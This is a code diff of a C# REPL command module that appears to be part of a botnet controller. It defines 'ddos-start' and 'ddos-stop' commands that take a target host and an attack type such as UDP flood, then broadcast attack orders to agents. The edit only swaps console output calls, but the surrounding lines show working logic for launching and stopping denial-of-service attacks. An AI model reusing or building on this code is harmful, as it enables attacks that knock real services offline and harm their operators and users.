@@ -45,14 +45,14 @@ namespace REPL.Commands
                 }
                 if (string.IsNullOrEmpty(Target))
                 {
-                    _repl.Console.WriteLine("commands: Missing required argument `--target=TARGET`.");
-                    _repl.Console.WriteLine("commands: Use `help ddos-start` for details.");
+                    Console.WriteLine("commands: Missing required argument `--target=TARGET`.");
+                    Console.WriteLine("commands: Use `help ddos-start` for details.");
                     return 1;
                 }
                 if (string.IsNullOrEmpty(Type))
                 {
-                    _repl.Console.WriteLine("commands: Missing required argument `--typet=TYPE`.");
-                    _repl.Console.WriteLine("commands: Use `help ddos-start` for details.");
+                    Console.WriteLine("commands: Missing required argument `--typet=TYPE`.");
+                    Console.WriteLine("commands: Use `help ddos-start` for details.");
                     return 1;
                 }
 
@@ -69,8 +69,8 @@ namespace REPL.Commands
                         type= DosType.UdpFlood;
                         break;
                     default:
-                        _repl.Console.WriteLine("commands: Invalid attack type.");
-                        _repl.Console.WriteLine("commands: Use `help ddos-start` for details.");
+                        Console.WriteLine("commands: Invalid attack type.");
+                        Console.WriteLine("commands: Use `help ddos-start` for details.");
                         return 1;
                 }
                 var endpointParts = Target.Split(':');
@@ -86,8 +86,8 @@ namespace REPL.Commands
                     Buffer = new byte[0]
                 };
                 _agent.MessagesManager.Broadcast(ddosMessage, 6);
-                _repl.Console.WriteLine($"Attack sessionID {session}");
-                _repl.Console.WriteLine($"Stop it using ´ddos-stop {session}´");
+                Console.WriteLine($"Attack sessionID {session}");
+                Console.WriteLine($"Stop it using ´ddos-stop {session}´");
                 _repl.AddAutocompletionWords(session.ToString());
                 return 0;
             }
@@ -135,8 +135,8 @@ namespace REPL.Commands
                 }
                 if (extra.Count == 0)
                 {
-                    _repl.Console.WriteLine("commands: Missing required argument `SESSIONID`.");
-                    _repl.Console.WriteLine("commands: Use `help ddos-stop` for details.");
+                    Console.WriteLine("commands: Missing required argument `SESSIONID`.");
+                    Console.WriteLine("commands: Use `help ddos-stop` for details.");
                     return 1;
                 }
                 var session = ulong.Parse(extra[0]);
@@ -145,7 +145,7 @@ namespace REPL.Commands
                     AttackId = session
                 };
                 _agent.MessagesManager.Broadcast(ddosStopMessage, 6);
-                _repl.Console.WriteLine("stopping attack....");
+                Console.WriteLine("stopping attack....");
                 return 0;
             }
             catch (Exception e)
